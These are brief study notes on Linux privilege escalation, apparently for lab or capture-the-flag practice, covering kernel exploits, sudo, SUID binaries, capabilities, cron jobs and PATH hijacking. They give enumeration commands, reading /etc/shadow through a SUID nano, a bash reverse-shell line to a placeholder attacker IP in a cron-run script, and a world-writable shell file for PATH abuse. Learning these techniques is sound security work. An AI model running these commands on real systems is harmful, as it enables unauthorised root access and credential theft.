		--- Kernel Exploit ---

The Kernel exploit methodology;

    1) Find the kernel version
    2) Search for the exploit for the known kernel version.
    3) EXecute the exploit

		--- Sudo ---

    1) Look for application that allows us to run with root privileges (sudo -l)
    2) Look at the https://gtfobins.github.io/ for exploits

		--- SUID ---

    1) "find / -type f -perm -04000 -ls 2>/dev/null" will list files that have SUID or SGID bits set.
    2) Look to GTFOBins.
    3) Example: If nano has SUID bit set, "nano /etc/shadow" command will print the contens of /etc/shadow

		--- Capabilities ---

    1) We can use the "getcap" tool to list enabled capabilities. --> getcap -r /
    2) Look at the GTFOBins.

		--- Cron Jobs ---

    1) Our goal will be to find a cron job set by root and have it run our script, ideally a shell.
    2) Ex: if some python files are running as cron jobs, we can edit that file to give us root shell.
    3) #!bin/bash
       bash -i >& /dev/tcp/<IP of Attacker/<Port to Listen> 0>&1 (open a listener on host machine)

		--- PATH ---

   1) Let's look what folders are located under $PATH --> echo $PATH
   2) Can we have the privilege to write that folder? --> find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
   3) Let's say we can write to the tmp/ folder. --> export PATH=/tmp:$PATH
   4) Let's create a root shell file located at /tmp --> echo "/bin/bash" > FILE
   5) Make that file readible, writable and executable for all users --> chmod 777 FILE
   6) If user1 executes this file, we have user1's shell. If root executes, we r gonna have root shell.
